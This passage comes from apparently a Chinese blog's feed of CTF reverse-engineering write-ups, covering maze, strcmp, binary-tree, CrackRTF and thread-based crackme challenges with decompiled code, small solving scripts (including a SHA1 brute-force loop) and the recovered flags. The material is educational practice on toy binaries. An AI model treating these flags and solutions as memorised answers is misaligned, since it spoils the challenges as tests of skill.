sub_4013D0(v47, &amp;v76);                </span><br><span class="line">  sub_440CE0(v24, <span class="string">&quot;###################********************************############*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v77 = <span class="number">13</span>;</span><br><span class="line">  v25 = sub_4013D0(v47, &amp;v77);                  </span><br><span class="line">  sub_440CE0(v25, <span class="string">&quot;###############################################################*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v78 = <span class="number">28</span>;</span><br><span class="line">  v26 = sub_4013D0(v47, &amp;v78);              </span><br><span class="line">  sub_440CE0(v26, <span class="string">&quot;#########################*****************************************************************&quot;</span>);</span><br><span class="line">  v79 = <span class="number">14</span>;</span><br><span class="line">  v27 = sub_4013D0(v47, &amp;v79);           </span><br><span class="line">  sub_440CE0(v27, <span class="string">&quot;###***************************************************#########*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v80 = <span class="number">27</span>;</span><br><span class="line">  v28 = sub_4013D0(v47, &amp;v80);                  </span><br><span class="line">  sub_440CE0(v28, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v81 = <span class="number">29</span>;</span><br><span class="line">  v29 = sub_4013D0(v47, &amp;v81);                  </span><br><span class="line">  sub_440CE0(v29, <span class="string">&quot;#*#######*####**###*#######***#######*########**###*******##*****##########################&quot;</span>);</span><br><span class="line">  v82 = <span class="number">30</span>;</span><br><span class="line">  v30 = sub_4013D0(v47, &amp;v82);                  </span><br><span class="line">  sub_440CE0(v30, <span class="string">&quot;##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v83 = <span class="number">31</span>;</span><br><span class="line">  v31 = sub_4013D0(v47, &amp;v83);                  </span><br><span class="line">  sub_440CE0(v31, <span class="string">&quot;###*###*####*###*##*######*##**####*###*####*#########*#####***############################&quot;</span>);</span><br><span class="line">  v84 = <span class="number">32</span>;</span><br><span class="line">  v32 = sub_4013D0(v47, &amp;v84);                  </span><br><span class="line">  sub_440CE0(v32, <span class="string">&quot;####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v85 = <span class="number">33</span>;</span><br><span class="line">  v33 = sub_4013D0(v47, &amp;v85);                  </span><br><span class="line">  sub_440CE0(v33, <span class="string">&quot;#####*#######**####****####**####*#######*####**######*#####*##############################&quot;</span>);</span><br><span class="line">  v86 = <span class="number">0</span>;</span><br><span class="line">  v34 = sub_4013D0(v47, &amp;v86);</span><br><span class="line">  v35 = sub_43F820(v34);</span><br><span class="line">  v36 = sub_407C60(qword_73EFA0, v35);</span><br><span class="line">  sub_407610(v36, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v87 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_420230(&amp;unk_73F0C0, &amp;v48);</span><br><span class="line">    <span class="keyword">if</span> ( v48 == <span class="string">&#x27;L&#x27;</span> )                           <span class="comment">// 左移</span></span><br><span class="line">    &#123;</span><br><span class="line">      --x;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &gt; <span class="string">&#x27;L&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;R&#x27;</span> )                         <span class="comment">// 右移</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;U&#x27;</span> )                         <span class="comment">// 上移</span></span><br><span class="line">      &#123;</span><br><span class="line">        --y;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v48 == <span class="string">&#x27;D&#x27;</span> )                      <span class="comment">// 下移</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++y;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v87 = <span class="number">0</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    v37 = y;</span><br><span class="line">    v38 = x;</span><br><span class="line">    v39 = sub_407670(qword_73EFA0, v48);</span><br><span class="line">    v40 = sub_407610(v39, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v41 = sub_4079B0(v40, v38);</span><br><span class="line">    v42 = sub_407610(v41, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v43 = sub_4079B0(v42, v37);</span><br><span class="line">    sub_407610(v43, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">89</span> &amp;&amp; y == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_407610(qword_73EFA0, <span class="string">&quot;WIN\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; x &lt;= <span class="number">89</span> &amp;&amp; y &lt;= <span class="number">28</span> )<span class="comment">// 坐标（89，28）</span></span><br><span class="line">    &#123;</span><br><span class="line">      v44 = x;</span><br><span class="line">      v45 = sub_4013D0(v47, &amp;y);</span><br><span class="line">      <span class="keyword">if</span> ( *sub_4412E0(v45, v44) != <span class="string">&#x27;#&#x27;</span> )       <span class="comment">// 不能碰到#</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_407610(qword_73EFA0, <span class="string">&quot;FAIL\n&quot;</span>);</span><br><span class="line">LABEL_24:</span><br><span class="line">  sub_4013B6(v47);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的迷宫为乱序排序，可根据迷宫上面的数字排列出正常顺序，需排到29行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">**########################################################################################</span><br><span class="line">#*######################*******************************************#####*************#####</span><br><span class="line">#************************####*####################################*#####*###########*#####</span><br><span class="line">#########*#########*#########*#######***************************##*#####*###########*#####</span><br><span class="line">#******##*#########*#########*#######*#########################*##*#####*###########*#####</span><br><span class="line">#*####*##*#########*#########*#######*#########################*##*#####********####*#####</span><br><span class="line">#*####*##*#########*######*******####*###**********####****####*##*############*####*#####</span><br><span class="line">#*##***#**#########*#################*###*########*####*#######*##*############*####*#####</span><br><span class="line">#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####</span><br><span class="line">#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">#************######*##############**************##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">###################*##############################*####***#####*##*##*###*#####*####*#####</span><br><span class="line">###################********************************############*##*##*###*#####*####*#####</span><br><span class="line">###############################################################*##*##*###*#####*####*#####</span><br><span class="line">###***************************************************#########*##*##*###*#####*####*#####</span><br><span class="line">###*#################################################*#########*##*######*#####*####*#####</span><br><span class="line">###*####*****#####**********************#############*#########*##********#####*####*#####</span><br><span class="line">###*####*###*#####*####################***************#########*###############*####*#####</span><br><span class="line">###*####*###*#####*############################################*****************####*#####</span><br><span class="line">###******###*#####*#################################################################*#####</span><br><span class="line">############*#####*******************************************************************#####</span><br><span class="line">###**********#############################################################################</span><br><span class="line">###*#########*****************************************************************############</span><br><span class="line">###*#########*###############################################*############################</span><br><span class="line">###*#########*###############################################*######*****************#####</span><br><span class="line">###**************************************************########*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#########################*****************************************************************</span><br></pre></td></tr></table></figure><p><img src="/2021/10/08/ctfwiki-re/1.PNG"></p><blockquote><p>RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-2</title>
      <link href="2021/10/08/buu-re-2/"/>
      <url>2021/10/08/buu-re-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Oruga"><a href="#Oruga" class="headerlink" title="Oruga"></a>Oruga</h1><p>64位程序，无壳，拖入ida中反编译</p><p><img src="/2021/10/08/buu-re-2/1.PNG"></p><p>flag前五位应为actf{，然后查看sub_78A</p><h2 id="sub-78A"><a href="#sub-78A" class="headerlink" title="sub_78A"></a>sub_78A</h2><p><img src="/2021/10/08/buu-re-2/2.PNG"><br><img src="/2021/10/08/buu-re-2/3.PNG"></p><p>看了别人的思路才知道是迷宫<br>从左上角开始，到！结束，在16进制试图下查看更明显</p><p><img src="/2021/10/08/buu-re-2/4.PNG"></p><p>走完迷宫即可得到flag</p><blockquote><p>flag{MEWEMEWJMEWJM}</p></blockquote><h1 id="easy-strcmp"><a href="#easy-strcmp" class="headerlink" title="easy strcmp"></a>easy strcmp</h1><p>64位程序，无壳<br>查看main函数</p><p><img src="/2021/10/08/buu-re-2/5.PNG"></p><p>除了一个比较找不到其他信息，查看其余函数，sub_6EA具有明显逻辑。</p><p><img src="/2021/10/08/buu-re-2/6.PNG"></p><p>一个减法运算，写脚本解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">24</span>] = &#123;<span class="number">0x42</span>, <span class="number">0x09</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0xF0</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> str[<span class="number">24</span>] = &#123;<span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x4E</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] += str[i];</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">9</span>||i==<span class="number">11</span>||i==<span class="number">13</span>||i==<span class="number">14</span>)</span><br><span class="line">            flag[i]+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要在第i=9、11、13、14时进行+1，我也不明白，看看这两篇文章或许你就能明白。<br><a href="https://blog.csdn.net/Tokameine/article/details/118148770?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">文章1</a><br><a href="https://ctftime.org/writeup/18785">文章2</a></p><blockquote><p>flag{l3ts_m4k3_4_DETOUR_t0d4y}</p></blockquote><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>在虚拟机里运行一下，出现两端类似flag的字符串</p><p><img src="/2021/10/08/buu-re-2/7.PNG"></p><p>文件为64位，放入ida中查看main函数</p><p><img src="/2021/10/08/buu-re-2/8.PNG"></p><p>函数type1与type2应该我加密函数，点进去</p><p><img src="/2021/10/08/buu-re-2/9.PNG"><br><img src="/2021/10/08/buu-re-2/10.PNG"></p><p>再加上main函数中的那些描述语句，可猜测这是二叉树，type1为中序遍历，type2为后续遍历<br>网上随便抄个脚本<a href="https://blog.csdn.net/qq_34950042/article/details/103738130">链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">假设根节点在中序遍历中的位置为pos，树的结点数为len，即 len=inorder.length()</span></span><br><span class="line"><span class="comment">代码：pos = inorder.find(preorder[0]) or pos = inorder.find(postorder[postorder.size()-1])</span></span><br><span class="line"><span class="comment">先序遍历(NLR), 根节点编号(0), 左子树编号(1~pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">中序遍历(LNR), 左子树编号(0~pos-1), 根节点编号(pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">后序遍历(LRN), 左子树编号(0~pos-1), 右子树编号(pos~len-2), 根点编号(len-1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(<span class="built_in">string</span> preorder,<span class="built_in">string</span> inorder)</span></span>&#123;<span class="comment">//由先序遍历+中序遍历序列，递归实现后序遍历 (LRN)</span></span><br><span class="line">    <span class="keyword">int</span> len = preorder.length();</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)</span><br><span class="line">    &#123;  <span class="comment">//单个结点</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos=inorder.find(preorder[<span class="number">0</span>]);   <span class="comment">// 查找根节点在中序序列中的位置，通过根节点划分左右子树</span></span><br><span class="line">    <span class="comment">// 类似于后序遍历过程</span></span><br><span class="line">    postorder(preorder.substr(<span class="number">1</span>,pos), inorder.substr(<span class="number">0</span>,pos));<span class="comment">//后序遍历左子树</span></span><br><span class="line">    postorder(preorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>), inorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>));<span class="comment">//后序遍历右子树，pos从0开始，所以len-pos-1</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];    <span class="comment">//最后输出根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(<span class="built_in">string</span> inorder, <span class="built_in">string</span> postorder)</span> <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列 (NLR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = postorder.length();</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="comment">// 空树</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)   <span class="comment">// 单个结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;inorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos = inorder.find(postorder[len<span class="number">-1</span>]);</span><br><span class="line">    <span class="comment">// 类似于先序遍历过程</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;postorder[len<span class="number">-1</span>];</span><br><span class="line">    preorder(inorder.substr(<span class="number">0</span>, pos),  postorder.substr(<span class="number">0</span>, pos)); <span class="comment">//先序遍历左子树</span></span><br><span class="line">    preorder(inorder.substr(pos+<span class="number">1</span>, len-pos<span class="number">-1</span>), postorder.substr(pos, len-pos<span class="number">-1</span>));<span class="comment">//先序遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1,s2;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;s2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//postorder(s1,s2);           //由先序遍历+中序遍历序列，递归实现后序遍历</span></span><br><span class="line">        preorder(s1, s2);           <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_IS_A_7reE}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-1</title>
      <link href="2021/10/08/buu-re-1/"/>
      <url>2021/10/08/buu-re-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h1><p>32位程序，无壳，直接ida32反编译。</p><h2 id="第一次输入"><a href="#第一次输入" class="headerlink" title="第一次输入"></a>第一次输入</h2><p><img src="/2021/10/08/buu-re-1/1.png"><br><img src="/2021/10/08/buu-re-1/2.png"></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">hash标识符官网查询</a><br>根据对destination的限制可对其进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag=<span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">str1=<span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    str2 = hashlib.sha1((<span class="built_in">str</span>(i)+flag).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    str3 = str2.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> str1 == str3:</span><br><span class="line">            <span class="built_in">print</span> (<span class="built_in">str</span>(i)+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得出结果为123321<br>然后查看下面的内容</p><h2 id="第二次输入"><a href="#第二次输入" class="headerlink" title="第二次输入"></a>第二次输入</h2><p><img src="/2021/10/08/buu-re-1/3.png"><br><img src="/2021/10/08/buu-re-1/4.png"></p><p>此处的md5加密进行爆破很困难，但下面还有一个验证函数，进去查看。<br>网上查看了多篇博客，知道了基本原理。</p><p><img src="/2021/10/08/buu-re-1/5.png"><br><a href="https://www.cnblogs.com/palmer0801/p/12111821.html">图片来源</a></p><p>里面还有一个小函数</p><p><img src="/2021/10/08/buu-re-1/6.PNG"></p><p>从AAA中提取的信息与输入进行异或<br>使用Resource_Hacker打开程序</p><p><img src="/2021/10/08/buu-re-1/7.PNG"></p><p>异或的结果保存到dbapp.rtf中，所以要读取他里面的内容，并与前六位异或，就可以得到原先的值<br>.rtf开头都是{\rtf1\ansi  取其前六位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x05</span>,<span class="number">0x7D</span>,<span class="number">0x41</span>,<span class="number">0x15</span>,<span class="number">0x26</span>,<span class="number">0x01</span>]</span><br><span class="line">s = <span class="string">&quot;&#123;\\rtf1&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]) ^ a[i]</span><br><span class="line">    b+=<span class="built_in">chr</span>(x)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#得到~!3a@0，输入到程序后会得到一个名为dbapp.rtf的文件，打开获得flag。</span></span><br></pre></td></tr></table></figure><blockquote><p>Flag{N0_M0re_Free_Bugs}</p></blockquote><h1 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h1><p>32位程序，有upx壳，脱去，再放入ida<br>查看main函数</p><p><img src="/2021/10/08/buu-re-1/8.PNG"></p><p>里面创建了两个线程，先执行线程1，再执行线程2，循环往复。</p><h2 id="线程1"><a href="#线程1" class="headerlink" title="线程1"></a>线程1</h2><p><img src="/2021/10/08/buu-re-1/9.PNG"><br><img src="/2021/10/08/buu-re-1/10.PNG"></p><h2 id="线程2"><a href="#线程2" class="headerlink" title="线程2"></a>线程2</h2><p><img src="/2021/10/08/buu-re-1/11.PNG"></p><p>里面没有什么东西</p><h2 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h2><p><img src="/2021/10/08/buu-re-1/12.PNG"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dword_418008[] =  <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasd&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> off_418004[] = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">29</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">28</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i]=off_418004[i];</span><br><span class="line">           <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">52</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(off_418004[i]==dword_418008[j])</span><br><span class="line">            &#123;</span><br><span class="line">                flag[i] = j+ <span class="number">38</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(flag[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;flag[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">                    flag[i] = j + <span class="number">96</span>;</span><br><span class="line">                <span class="comment">//break;</span></span><br><span class="line">               <span class="comment">// printf(&quot;%d:%c\n&quot;,i,flag[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="comment">//for(i=0;i&lt;29;i++)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只得到了29，但最后一个可以试出来，为E</p><blockquote><p>flag{ThisisthreadofwindowshahaIsESE}</p></blockquote><h1 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h1><p>apk逆向，不是很懂，看别人的wp，通过搜索字符串转到关键信息处，ida打开so文件，base58解密获得邮箱.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
